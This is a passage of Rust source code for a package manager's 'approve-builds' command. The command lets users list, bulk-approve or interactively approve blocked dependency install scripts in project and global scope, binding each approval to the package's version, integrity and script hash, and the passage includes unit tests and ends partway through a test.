/// canonical helper [`crate::version_diff::blocked_to_json`] so the
/// approve-builds JSON paths and the install-pipeline JSON paths
/// emit byte-identical entry shapes. Pre-Chunk-4 this was an inline
/// `serde_json::json!` literal; consolidating prevents key drift
/// between the two callers as future fields land.
fn blocked_to_json(blocked: &BlockedPackage, trusted: &TrustedDependencies) -> serde_json::Value {
    crate::version_diff::blocked_to_json(blocked, trusted)
}

fn print_summary(
    state: &BuildState,
    approved: &[&BlockedPackage],
    skipped: &[&BlockedPackage],
    trusted: &TrustedDependencies,
    initial_was_legacy: bool,
    yes_flag: bool,
    json_output: bool,
) -> Result<(), LpmError> {
    if json_output {
        let mut warnings: Vec<serde_json::Value> = Vec::new();
        if yes_flag {
            warnings.push(serde_json::json!({
                "code": "yes_blanket_approve",
                "message": format!(
                    "--yes blanket-approved {} package(s) without per-package review",
                    approved.len()
                ),
            }));
        }
        if initial_was_legacy && !approved.is_empty() {
            warnings.push(serde_json::json!({
                "code": "legacy_upgraded_to_rich",
                "message": "trustedDependencies was upgraded from the legacy array form to the rich map form"
            }));
        }
        let body = serde_json::json!({
            "schema_version": SCHEMA_VERSION,
            "command": "approve-builds",
            "mode": if yes_flag { "yes" } else { "interactive" },
            "blocked_count": state.blocked_packages.len(),
            "approved_count": approved.len(),
            "skipped_count": skipped.len(),
            // Phase 46 P7 Chunk 4: per-entry `version_diff` flows
            // through `blocked_to_json`. Note: when this fires
            // post-write-back (the --yes and interactive paths),
            // `trusted` includes the just-written binding for
            // `name@candidate_version`. The diff selector is
            // strictly-less-than the candidate, so it skips the
            // freshly-added entry and still reports the diff
            // against the prior version — matches what the user
            // saw when reviewing.
            "approved": approved.iter().map(|b| blocked_to_json(b, trusted)).collect::<Vec<_>>(),
            "skipped": skipped.iter().map(|b| blocked_to_json(b, trusted)).collect::<Vec<_>>(),
            "warnings": warnings,
            "errors": [],
        });
        println!("{}", serde_json::to_string_pretty(&body).unwrap());
    } else {
        println!();
        if approved.is_empty() && skipped.is_empty() {
            output::info("No changes to package.json.");
        } else {
            output::success(&format!(
                "{} approved, {} skipped.",
                approved.len(),
                skipped.len()
            ));
            if !approved.is_empty() {
                output::info("Run `lpm build` to execute the approved scripts.");
            }
            if initial_was_legacy {
                output::info(
                    "trustedDependencies upgraded from legacy array to rich form (binding metadata).",
                );
            }
        }
    }
    Ok(())
}

#[allow(dead_code)]
fn _build_state_path_for_tests(project_dir: &Path) -> PathBuf {
    build_state::build_state_path(project_dir)
}

// ─── Phase 37 M5.3: approve-builds --global ────────────────────────────

/// Threshold at which `--group` auto-enables for `--global` review.
/// Reviewing N-at-once packages one-by-one past this size is typically
/// impractical; the grouped UI shows the same info indexed by
/// top-level globally-installed package instead of per-dep.
pub const GROUP_AUTO_THRESHOLD: usize = 10;

/// Global-scope approve-builds entry point. Mirrors [`run`] but sources
/// the blocked set from [`crate::global_blocked_set`] and persists
/// approvals to `~/.lpm/global/trusted-dependencies.json` instead of
/// the project's `package.json`.
///
/// Mode matrix (identical shape to `run`):
///
///   list=true                → read-only print; no mutations
///   yes=true                 → bulk approve every remaining row
///   package=Some(pkg)        → approve one row by name/`name@version`
///   otherwise, is_tty()      → interactive walk (cliclack)
///   otherwise, not is_tty()  → hard error; recommend --list or --yes
///
/// `group` groups both read-only list output and the interactive global
/// review by top-level globally-installed package. Persisted approvals
/// still remain per dependency binding row. Grouped output auto-enables
/// when the effective set exceeds [`GROUP_AUTO_THRESHOLD`] and the caller
/// didn't explicitly set it.
pub async fn run_global(
    package: Option<&str>,
    yes: bool,
    list: bool,
    group: bool,
    json_output: bool,
) -> Result<(), LpmError> {
    // Mirror `run()`'s argument validation.
    if yes && list {
        return Err(LpmError::Script(
            "`--list` is read-only and conflicts with `--yes`. \
             Pick one: `--list` to inspect, or `--yes` to approve."
                .into(),
        ));
    }
    if list && package.is_some() {
        return Err(LpmError::Script(
            "`--list` cannot take a package name argument. \
             It prints the entire blocked set in read-only mode."
                .into(),
        ));
    }
    if group && (yes || package.is_some()) {
        return Err(LpmError::Script(
            "`--group` only affects `lpm approve-builds --global --list` and the \
             interactive global review. It does not apply to `--yes` or direct package approval."
                .into(),
        ));
    }

    let root = lpm_common::LpmRoot::from_env()?;
    let aggregate = crate::global_blocked_set::aggregate_blocked_across_globals(&root)?;
    let effective_group = group || aggregate.rows.len() > GROUP_AUTO_THRESHOLD;

    // ── List mode ─────────────────────────────────────────────────
    if list {
        return print_global_list(&aggregate, effective_group, json_output);
    }

    // ── Empty set short-circuit (same as project-scoped run) ────
    if aggregate.rows.is_empty() {
        if json_output {
            let body = serde_json::json!({
                "schema_version": SCHEMA_VERSION,
                "command": "approve-builds",
                "scope": "global",
                "blocked_count": 0,
                "approved_count": 0,
                "skipped_count": 0,
                "blocked": [],
                "warnings": [],
                "errors": [],
                "unreadable_origins": aggregate.unreadable_origins,
            });
            println!("{}", serde_json::to_string_pretty(&body).unwrap());
        } else if !aggregate.unreadable_origins.is_empty() {
            output::warn(&format!(
                "{} globally-installed package(s) have missing or unreadable build-state \
                 files; the aggregate may be incomplete: {}",
                aggregate.unreadable_origins.len(),
                aggregate.unreadable_origins.join(", "),
            ));
        } else {
            output::success(
                "Nothing to approve. All globally-installed packages' scripts are covered.",
            );
        }
        return Ok(());
    }

    // ── Named-package approval path ───────────────────────────────
    if let Some(arg) = package {
        return run_global_named(&root, &aggregate, arg, json_output).await;
    }

    // ── Bulk-approve mode ─────────────────────────────────────────
    if yes {
        return run_global_bulk_yes(&root, &aggregate, json_output).await;
    }

    // ── Interactive walk ──────────────────────────────────────────
    if !is_tty() || json_output {
        // No TTY (or JSON mode) + no flags: surface the deterministic
        // error naming --list / --yes so CI / agents know how to proceed.
        return Err(LpmError::Script(format!(
            "`lpm approve-builds --global` needs a TTY for the interactive walk \
             ({} global package(s) with blocked scripts). Pass `--list` to inspect, \
             `--yes` to bulk-approve, or `<pkg>` to approve one.",
            aggregate.rows.len(),
        )));
    }
    run_global_interactive(&root, &aggregate, effective_group, json_output).await
}

/// `--list` implementation: print the aggregate read-only. `--group`
/// toggles the output shape (rows-by-dep vs by-top-level).
fn print_global_list(
    aggregate: &crate::global_blocked_set::AggregateBlockedSet,
    group: bool,
    json_output: bool,
) -> Result<(), LpmError> {
    if json_output {
        let entries: Vec<_> = aggregate
            .rows
            .iter()
            .map(|r| {
                serde_json::json!({
                    "name": r.name,
                    "version": r.version,
                    "integrity": r.integrity,
                    "script_hash": r.script_hash,
                    "phases_present": r.phases_present,
                    "binding_drift": r.binding_drift,
                    "origins": r.origins,
                })
            })
            .collect();
        let body = serde_json::json!({
            "schema_version": SCHEMA_VERSION,
            "command": "approve-builds",
            "scope": "global",
            "group": group,
            "blocked_count": aggregate.rows.len(),
            "blocked": entries,
            "unreadable_origins": aggregate.unreadable_origins,
            "warnings": [],
            "errors": [],
        });
        println!("{}", serde_json::to_string_pretty(&body).unwrap());
        return Ok(());
    }
    if aggregate.rows.is_empty() {
        output::success("Nothing blocked globally.");
        return Ok(());
    }
    println!();
    output::info(&format!(
        "{} package{} blocked pending review:",
        aggregate.rows.len().to_string().bold(),
        if aggregate.rows.len() == 1 { "" } else { "s" },
    ));
    println!();
    if group {
        // Group by the first listed origin (globally-installed
        // package name). Rows with multiple origins appear once per
        // origin so the user sees which global install needs which
        // approvals.
        let mut by_origin: std::collections::BTreeMap<
            &str,
            Vec<&crate::global_blocked_set::AggregateBlockedRow>,
        > = std::collections::BTreeMap::new();
        for row in &aggregate.rows {
            for origin in &row.origins {
                by_origin.entry(origin.as_str()).or_default().push(row);
            }
        }
        for (origin, rows) in by_origin {
            println!(
                "  {} ({} blocked dep{}):",
                origin.bold(),
                rows.len(),
                if rows.len() == 1 { "" } else { "s" },
            );
            for r in rows {
                println!(
                    "    {} @ {}{}",
                    r.name,
                    r.version.dimmed(),
                    if r.binding_drift {
                        "  [binding drift]".yellow().to_string()
                    } else {
                        String::new()
                    }
                );
            }
            println!();
        }
    } else {
        for r in &aggregate.rows {
            println!(
                "  {} @ {} — used by {}{}",
                r.name.bold(),
                r.version.dimmed(),
                r.origins.join(", "),
                if r.binding_drift {
                    "  [binding drift]".yellow().to_string()
                } else {
                    String::new()
                }
            );
        }
    }
    if !aggregate.unreadable_origins.is_empty() {
        println!();
        output::warn(&format!(
            "Note: {} globally-installed package(s) have missing build-state files and were \
             skipped — run `lpm install -g <pkg>` to repopulate: {}",
            aggregate.unreadable_origins.len(),
            aggregate.unreadable_origins.join(", "),
        ));
    }
    println!();
    Ok(())
}

/// `--yes` implementation: approve every row in the aggregate in one
/// write. Loud — emits a warning banner in non-JSON mode; in JSON mode
/// surfaces the warning via the structured `warnings` field so agents
/// can detect bulk-approval flows.
async fn run_global_bulk_yes(
    root: &lpm_common::LpmRoot,
    aggregate: &crate::global_blocked_set::AggregateBlockedSet,
    json_output: bool,
) -> Result<(), LpmError> {
    let mut trust = lpm_global::trusted_deps::read_for(root)?;
    for row in &aggregate.rows {
        trust.insert_strict(
            &row.name,
            &row.version,
            row.integrity.clone(),
            row.script_hash.clone(),
        );
    }
    lpm_global::trusted_deps::write_for(root, &trust)?;

    if json_output {
        let body = serde_json::json!({
            "schema_version": SCHEMA_VERSION,
            "command": "approve-builds",
            "scope": "global",
            "blocked_count": aggregate.rows.len(),
            "approved_count": aggregate.rows.len(),
            "skipped_count": 0,
            "warnings": [
                format!(
                    "bulk-approved {} globally-blocked package(s) via --yes",
                    aggregate.rows.len()
                )
            ],
            "errors": [],
        });
        println!("{}", serde_json::to_string_pretty(&body).unwrap());
    } else {
        output::warn(&format!(
            "Bulk-approved {} globally-blocked package{}.",
            aggregate.rows.len(),
            if aggregate.rows.len() == 1 { "" } else { "s" },
        ));
        output::info(
            "Trust is bound to the current (name, version, integrity, script_hash) tuple — \
             any subsequent drift re-opens review.",
        );
    }
    Ok(())
}

/// Named-package approval: `lpm approve-builds --global esbuild` or
/// `--global esbuild@0.25.1`. Finds the matching row by name or
/// `name@version` substring, writes one trust binding.
async fn run_global_named(
    root: &lpm_common::LpmRoot,
    aggregate: &crate::global_blocked_set::AggregateBlockedSet,
    arg: &str,
    json_output: bool,
) -> Result<(), LpmError> {
    // M5 audit (GPT finding 1): bare-name lookup must refuse silently-
    // picking-first when multiple rows match. Aggregate rows are deduped
    // by `(name, version, integrity, script_hash)` per M5's dedup rule,
    // so a single bare name can legitimately resolve to multiple rows
    // (same package at different versions, OR same name@version with
    // different tarball bindings across install roots). Silently
    // approving the first match is a latent data-corruption bug —
    // require `name@version` disambiguation.
    let row = match lookup_aggregate_by_arg(&aggregate.rows, arg) {
        AggregateLookup::Match(row) => row,
        AggregateLookup::NotFound => {
            return Err(LpmError::NotFound(format!(
                "package '{arg}' is not in the global blocked set. Run \
                 `lpm approve-builds --global --list` to see what's blocked."
            )));
        }
        AggregateLookup::Ambiguous { candidates } => {
            // List the concrete name@version strings the user could
            // disambiguate with. Sorted + deduped so the hint is
            // deterministic regardless of row order.
            let mut keys: Vec<String> = candidates
                .iter()
                .map(|r| format!("{}@{}", r.name, r.version))
                .collect();
            keys.sort();
            keys.dedup();
            return Err(LpmError::Script(format!(
                "package '{arg}' is ambiguous in the global blocked set — {} rows match. \
                 Re-run with `name@version` to disambiguate. Candidates: {}",
                candidates.len(),
                keys.join(", "),
            )));
        }
    };
    let mut trust = lpm_global::trusted_deps::read_for(root)?;
    trust.insert_strict(
        &row.name,
        &row.version,
        row.integrity.clone(),
        row.script_hash.clone(),
    );
    lpm_global::trusted_deps::write_for(root, &trust)?;

    if json_output {
        let body = serde_json::json!({
            "schema_version": SCHEMA_VERSION,
            "command": "approve-builds",
            "scope": "global",
            "approved_count": 1,
            "skipped_count": 0,
            "blocked_count": aggregate.rows.len(),
            "approved": [{
                "name": row.name,
                "version": row.version,
                "integrity": row.integrity,
                "script_hash": row.script_hash,
            }],
            "warnings": [],
            "errors": [],
        });
        println!("{}", serde_json::to_string_pretty(&body).unwrap());
    } else {
        output::success(&format!(
            "Approved {} @ {} globally.",
            row.name.bold(),
            row.version.dimmed()
        ));
    }
    Ok(())
}

/// Result of resolving a user-supplied `<pkg>` argument to an aggregate
/// row. Three outcomes:
///
/// - `Match` — exactly one row matches. Approve it.
/// - `NotFound` — zero rows match the given arg. Caller surfaces
///   NotFound with a hint toward `--list`.
/// - `Ambiguous` — a BARE NAME matched multiple rows (different
///   versions, or same name@version with drifted bindings across
///   install roots). Caller surfaces a Script error listing the
///   candidates so the user can re-run with `name@version`.
///
/// `name@version` form cannot be ambiguous by construction — dedup in
/// the aggregator is keyed by `(name, version, integrity, script_hash)`,
/// so two rows with the same `name@version` imply different bindings
/// and that IS the disambiguation signal we want to preserve.
#[derive(Debug)]
enum AggregateLookup<'a> {
    Match(&'a crate::global_blocked_set::AggregateBlockedRow),
    NotFound,
    Ambiguous {
        candidates: Vec<&'a crate::global_blocked_set::AggregateBlockedRow>,
    },
}

/// Resolve an arg to an `AggregateLookup`. Replaces the pre-audit
/// `find_aggregate_by_arg` which silently took the first match on
/// bare-name lookups — see M5 audit finding 1.
fn lookup_aggregate_by_arg<'a>(
    rows: &'a [crate::global_blocked_set::AggregateBlockedRow],
    arg: &str,
) -> AggregateLookup<'a> {
    if let Some((name, version)) = arg.rsplit_once('@')
        && !name.is_empty()
    {
        // name@version form: collect ALL matches (different bindings
        // across installs), not just the first. One match → Match;
        // multiple → Ambiguous; zero → NotFound.
        let matches: Vec<&crate::global_blocked_set::AggregateBlockedRow> = rows
            .iter()
            .filter(|r| r.name == name && r.version == version)
            .collect();
        match matches.as_slice() {
            [] => AggregateLookup::NotFound,
            [single] => AggregateLookup::Match(single),
            _ => AggregateLookup::Ambiguous {
                candidates: matches,
            },
        }
    } else {
        // Bare name: collect ALL matches. Multiple = ambiguous.
        let matches: Vec<&crate::global_blocked_set::AggregateBlockedRow> =
            rows.iter().filter(|r| r.name == arg).collect();
        match matches.as_slice() {
            [] => AggregateLookup::NotFound,
            [single] => AggregateLookup::Match(single),
            _ => AggregateLookup::Ambiguous {
                candidates: matches,
            },
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Hash)]
struct AggregateRowKey {
    name: String,
    version: String,
    integrity: Option<String>,
    script_hash: Option<String>,
}

impl AggregateRowKey {
    fn from_row(row: &crate::global_blocked_set::AggregateBlockedRow) -> Self {
        Self {
            name: row.name.clone(),
            version: row.version.clone(),
            integrity: row.integrity.clone(),
            script_hash: row.script_hash.clone(),
        }
    }
}

fn group_remaining_rows_by_origin<'a>(
    aggregate: &'a crate::global_blocked_set::AggregateBlockedSet,
    decided: &std::collections::HashSet<AggregateRowKey>,
) -> std::collections::BTreeMap<String, Vec<&'a crate::global_blocked_set::AggregateBlockedRow>> {
    let mut grouped: std::collections::BTreeMap<
        String,
        Vec<&'a crate::global_blocked_set::AggregateBlockedRow>,
    > = std::collections::BTreeMap::new();

    for row in &aggregate.rows {
        if decided.contains(&AggregateRowKey::from_row(row)) {
            continue;
        }
        for origin in &row.origins {
            grouped.entry(origin.clone()).or_default().push(row);
        }
    }

    grouped
}

fn print_origin_group_card(origin: &str, rows: &[&crate::global_blocked_set::AggregateBlockedRow]) {
    println!();
    println!(
        "  {} ({} blocked dep{}):",
        origin.bold(),
        rows.len(),
        if rows.len() == 1 { "" } else { "s" },
    );
    for row in rows.iter().take(8) {
        println!(
            "    {} @ {}{}",
            row.name,
            row.version.dimmed(),
            if row.binding_drift {
                "  [binding drift]".yellow().to_string()
            } else {
                String::new()
            }
        );
    }
    if rows.len() > 8 {
        println!("    {}", format!("+{} more", rows.len() - 8).dimmed());
    }
    println!();
}

/// Interactive walk. Flat mode prompts one aggregate row at a time.
/// Grouped mode prompts by top-level global first, but still records
/// approvals as individual dependency binding rows.
async fn run_global_interactive(
    root: &lpm_common::LpmRoot,
    aggregate: &crate::global_blocked_set::AggregateBlockedSet,
    group: bool,
    _json_output: bool,
) -> Result<(), LpmError> {
    use crate::prompt::prompt_err;

    let mut trust = lpm_global::trusted_deps::read_for(root)?;
    let mut approved: Vec<&crate::global_blocked_set::AggregateBlockedRow> = Vec::new();
    let mut skipped: Vec<&crate::global_blocked_set::AggregateBlockedRow> = Vec::new();

    println!();
    output::info(&format!(
        "Reviewing {} globally-blocked package{}. Ctrl+C to stop.",
        aggregate.rows.len().to_string().bold(),
        if aggregate.rows.len() == 1 { "" } else { "s" },
    ));
    println!();

    if group {
        let mut decided: std::collections::HashSet<AggregateRowKey> =
            std::collections::HashSet::new();
        let mut quit_early = false;

        loop {
            let grouped = group_remaining_rows_by_origin(aggregate, &decided);
            let Some((origin, rows)) = grouped.into_iter().next() else {
                break;
            };

            print_origin_group_card(&origin, &rows);
            let choice: &str = cliclack::select(format!(
                "How would you like to review blocked deps for {}?",
                origin
            ))
            .item("approve_all", "Approve all for this global", "")
            .item("review", "Review individually", "")
            .item("skip_all", "Skip all for now", "")
            .item("quit", "Quit — stop here; approved rows kept", "")
            .initial_value("review")
            .interact()
            .map_err(prompt_err)?;

            match choice {
                "approve_all" => {
                    for row in &rows {
                        trust.insert_strict(
                            &row.name,
                            &row.version,
                            row.integrity.clone(),
                            row.script_hash.clone(),
                        );
                        approved.push(*row);
                        decided.insert(AggregateRowKey::from_row(row));
                    }
                    lpm_global::trusted_deps::write_for(root, &trust)?;
                }
                "skip_all" => {
                    for row in &rows {
                        skipped.push(*row);
                        decided.insert(AggregateRowKey::from_row(row));
                    }
                }
                "review" => {
                    for row in rows {
                        let key = AggregateRowKey::from_row(row);
                        if decided.contains(&key) {
                            continue;
                        }

                        print_aggregate_card(row);
                        let row_choice: &str =
                            cliclack::select(format!("{} @ {} — approve?", row.name, row.version))
                                .item("approve", "Approve", "")
                                .item("skip", "Skip", "")
                                .item("quit", "Quit — stop here; approved rows kept", "")
                                .initial_value("approve")
                                .interact()
                                .map_err(prompt_err)?;

                        match row_choice {
                            "approve" => {
                                trust.insert_strict(
                                    &row.name,
                                    &row.version,
                                    row.integrity.clone(),
                                    row.script_hash.clone(),
                                );
                                approved.push(row);
                                decided.insert(key);
                                lpm_global::trusted_deps::write_for(root, &trust)?;
                            }
                            "skip" => {
                                skipped.push(row);
                                decided.insert(key);
                            }
                            "quit" => {
                                quit_early = true;
                                break;
                            }
                            _ => unreachable!(),
                        }
                    }
                }
                "quit" => {
                    quit_early = true;
                }
                _ => unreachable!(),
            }

            if quit_early {
                break;
            }
        }

        println!();
        output::success(&format!(
            "{} approved, {} skipped, {} remaining.",
            approved.len(),
            skipped.len(),
            aggregate.rows.len() - approved.len() - skipped.len(),
        ));
        return Ok(());
    }

    for row in &aggregate.rows {
        print_aggregate_card(row);
        let choice: &str = cliclack::select(format!("{} @ {} — approve?", row.name, row.version))
            .item("approve", "Approve", "")
            .item("skip", "Skip", "")
            .item("quit", "Quit — stop here; approved rows kept", "")
            .initial_value("approve")
            .interact()
            .map_err(prompt_err)?;

        match choice {
            "approve" => {
                trust.insert_strict(
                    &row.name,
                    &row.version,
                    row.integrity.clone(),
                    row.script_hash.clone(),
                );
                approved.push(row);
                // Write after each approval so Ctrl+C mid-walk doesn't
                // lose previously-approved rows.
                lpm_global::trusted_deps::write_for(root, &trust)?;
            }
            "skip" => skipped.push(row),
            "quit" => break,
            _ => unreachable!(),
        }
    }
    println!();
    output::success(&format!(
        "{} approved, {} skipped, {} remaining.",
        approved.len(),
        skipped.len(),
        aggregate.rows.len() - approved.len() - skipped.len(),
    ));
    Ok(())
}

fn print_aggregate_card(row: &crate::global_blocked_set::AggregateBlockedRow) {
    println!(
        "  {} @ {}{}",
        row.name.bold(),
        row.version.dimmed(),
        if row.binding_drift {
            "  [binding drift]".yellow().to_string()
        } else {
            String::new()
        }
    );
    println!("    phases: {}", row.phases_present.join(", ").dimmed());
    println!("    origins: {}", row.origins.join(", ").dimmed());
    if let Some(integ) = &row.integrity {
        println!("    integrity: {}", integ.dimmed());
    }
    if let Some(sh) = &row.script_hash {
        println!("    script_hash: {}", sh.dimmed());
    }
    println!();
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::build_state::{BUILD_STATE_VERSION, BlockedPackage, BuildState};
    use lpm_workspace::TrustedDependencyBinding;
    use std::fs;
    use tempfile::tempdir;

    fn write_manifest(path: &Path, value: &serde_json::Value) {
        fs::write(path, serde_json::to_string_pretty(value).unwrap()).unwrap();
    }

    fn read_manifest(path: &Path) -> serde_json::Value {
        serde_json::from_str(&fs::read_to_string(path).unwrap()).unwrap()
    }

    fn make_blocked(name: &str, version: &str) -> BlockedPackage {
        BlockedPackage {
            name: name.to_string(),
            version: version.to_string(),
            integrity: Some(format!("sha512-{name}-integrity")),
            script_hash: Some(format!("sha256-{name}-hash")),
            phases_present: vec!["postinstall".to_string()],
            binding_drift: false,
            // Phase 46 fields default to None for these approve-builds
            // tests; dedicated tier-aware tests land in P2+.
            static_tier: None,
            provenance_at_capture: None,
            published_at: None,
            behavioral_tags_hash: None,
            behavioral_tags: None,
        }
    }

    /// Phase 46 P2 Chunk 4 helper: `make_blocked` + explicit tier.
    /// Used by the `--yes` refusal tests below to construct state
    /// that would be produced by a fresh P2 install pipeline.
    fn make_blocked_tiered(
        name: &str,
        version: &str,
        tier: lpm_security::triage::StaticTier,
    ) -> BlockedPackage {
        let mut b = make_blocked(name, version);
        b.static_tier = Some(tier);
        b
    }

    fn write_state(project_dir: &Path, blocked: Vec<BlockedPackage>) {
        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: "sha256-test".to_string(),
            captured_at: "2026-04-11T00:00:00Z".to_string(),
            blocked_packages: blocked,
        };
        crate::build_state::write_build_state(project_dir, &state).unwrap();
    }

    fn write_default_manifest(dir: &Path) {
        write_manifest(
            &dir.join("package.json"),
            &serde_json::json!({"name": "test", "version": "0.0.0"}),
        );
    }

    // ── Argument validation ─────────────────────────────────────────

    #[tokio::test]
    async fn approve_builds_yes_and_list_together_hard_errors() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        let err = run(dir.path(), None, true, true, true).await.unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("--list") && msg.contains("--yes"));
    }

    #[tokio::test]
    async fn approve_builds_list_with_pkg_arg_hard_errors() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        let err = run(dir.path(), Some("esbuild"), false, true, true)
            .await
            .unwrap_err();
        assert!(err.to_string().contains("--list"));
    }

    #[tokio::test]
    async fn approve_builds_with_no_state_file_errors_with_install_first_message() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        // No state file written
        let err = run(dir.path(), None, false, true, true).await.unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("lpm install"));
    }

    #[tokio::test]
    async fn approve_builds_with_no_package_json_errors() {
        let dir = tempdir().unwrap();
        // No package.json
        let err = run(dir.path(), None, false, true, true).await.unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("package.json"));
    }

    #[tokio::test]
    async fn approve_builds_with_empty_blocked_set_succeeds_silently() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![]);
        // --list mode with empty blocked set should succeed
        let result = run(dir.path(), None, false, true, true).await;
        assert!(result.is_ok());
    }

    // ── --list mode ─────────────────────────────────────────────────

    #[tokio::test]
    async fn approve_builds_list_does_not_mutate_package_json() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        let before = fs::read_to_string(dir.path().join("package.json")).unwrap();
        run(dir.path(), None, false, true, true).await.unwrap();
        let after = fs::read_to_string(dir.path().join("package.json")).unwrap();
        assert_eq!(before, after, "--list must NOT mutate package.json");
    }

    // ── --yes (bulk approve) ────────────────────────────────────────

    #[tokio::test]
    async fn approve_builds_yes_approves_everything_and_writes_rich_form() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(
            dir.path(),
            vec![
                make_blocked("esbuild", "0.25.1"),
                make_blocked("sharp", "0.33.0"),
            ],
        );

        run(dir.path(), None, true, false, true).await.unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        let td = &after["lpm"]["trustedDependencies"];
        assert!(td.is_object(), "must be Rich (object) form, got: {td}");
        let map = td.as_object().unwrap();
        assert!(map.contains_key("esbuild@0.25.1"));
        assert!(map.contains_key("sharp@0.33.0"));
        // Both bindings preserved
        assert_eq!(map["esbuild@0.25.1"]["scriptHash"], "sha256-esbuild-hash");
        assert_eq!(
            map["esbuild@0.25.1"]["integrity"],
            "sha512-esbuild-integrity"
        );
    }

    #[tokio::test]
    async fn approve_builds_yes_emits_warning_in_json_mode() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        // Capturing stdout in nextest is tricky; instead just verify the
        // command succeeds and the manifest mutation lands. The warning
        // emission via tracing::warn is exercised by the integration path.
        run(dir.path(), None, true, false, true).await.unwrap();
        let after = read_manifest(&dir.path().join("package.json"));
        assert!(after["lpm"]["trustedDependencies"]["esbuild@0.25.1"].is_object());
    }

    #[tokio::test]
    async fn approve_builds_yes_legacy_array_upgrades_to_rich() {
        let dir = tempdir().unwrap();
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": ["sharp"],
                },
            }),
        );
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

        run(dir.path(), None, true, false, true).await.unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        let td = &after["lpm"]["trustedDependencies"];
        assert!(td.is_object(), "legacy array must be upgraded to Rich");
        let map = td.as_object().unwrap();
        // New approval
        assert!(map.contains_key("esbuild@0.25.1"));
        // Legacy entry preserved as `<name>@*`
        assert!(map.contains_key("sharp@*"));
    }

    #[tokio::test]
    async fn approve_builds_yes_preserves_unrelated_manifest_fields() {
        let dir = tempdir().unwrap();
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "1.2.3",
                "scripts": {"build": "tsc"},
                "dependencies": {"react": "^18.0.0"},
                "lpm": {"linker": "isolated"},
            }),
        );
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

        run(dir.path(), None, true, false, true).await.unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        assert_eq!(after["name"], "test");
        assert_eq!(after["version"], "1.2.3");
        assert_eq!(after["scripts"]["build"], "tsc");
        assert_eq!(after["dependencies"]["react"], "^18.0.0");
        // Existing lpm fields preserved
        assert_eq!(after["lpm"]["linker"], "isolated");
        // New trustedDependencies added
        assert!(after["lpm"]["trustedDependencies"].is_object());
    }

    // ── <pkg> argument ──────────────────────────────────────────────

    #[tokio::test]
    async fn approve_builds_specific_package_by_name_approves_only_that_one() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(
            dir.path(),
            vec![
                make_blocked("esbuild", "0.25.1"),
                make_blocked("sharp", "0.33.0"),
            ],
        );

        // json_output=true so the confirm prompt is bypassed (auto-approve)
        run(dir.path(), Some("esbuild"), false, false, true)
            .await
            .unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        let map = after["lpm"]["trustedDependencies"]
            .as_object()
            .expect("must be Rich");
        assert!(
            map.contains_key("esbuild@0.25.1"),
            "esbuild must be approved"
        );
        assert!(
            !map.contains_key("sharp@0.33.0"),
            "sharp must NOT be approved (was not the target)"
        );
    }

    #[tokio::test]
    async fn approve_builds_specific_package_with_at_version_approves_only_that_one() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

        run(dir.path(), Some("esbuild@0.25.1"), false, false, true)
            .await
            .unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        assert!(after["lpm"]["trustedDependencies"]["esbuild@0.25.1"].is_object());
    }

    #[tokio::test]
    async fn approve_builds_specific_package_not_in_blocked_set_errors() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

        let err = run(dir.path(), Some("not-installed"), false, false, true)
            .await
            .unwrap_err();
        assert!(err.to_string().contains("not in the blocked set"));
    }

    #[tokio::test]
    async fn find_blocked_by_arg_handles_scoped_names_with_at_in_scope() {
        // Sanity check: a scoped name `@scope/pkg` should match the bare-name
        // path, not be misparsed as `name@version` with empty name. The
        // helper checks `at > 0` to avoid the leading-`@` confusion.
        let blocked = vec![
            make_blocked("@scope/pkg", "1.0.0"),
            make_blocked("plain", "2.0.0"),
        ];
        let by_bare_scoped = find_blocked_by_arg(&blocked, "@scope/pkg");
        assert!(by_bare_scoped.is_some());
        assert_eq!(by_bare_scoped.unwrap().name, "@scope/pkg");

        let by_versioned_scoped = find_blocked_by_arg(&blocked, "@scope/pkg@1.0.0");
        assert!(by_versioned_scoped.is_some());

        let by_plain = find_blocked_by_arg(&blocked, "plain");
        assert_eq!(by_plain.unwrap().name, "plain");
    }

    // ── Atomic write semantics ──────────────────────────────────────

    #[tokio::test]
    async fn approve_builds_writes_atomic_via_temp_file_rename() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        run(dir.path(), None, true, false, true).await.unwrap();

        // After a successful run, the parent directory should NOT contain
        // any leftover `.tmp` artifacts.
        let entries = std::fs::read_dir(dir.path()).unwrap();
        for entry in entries.flatten() {
            let name = entry.file_name();
            let s = name.to_string_lossy();
            assert!(
                !s.ends_with(".tmp") && !s.contains(".package.json."),
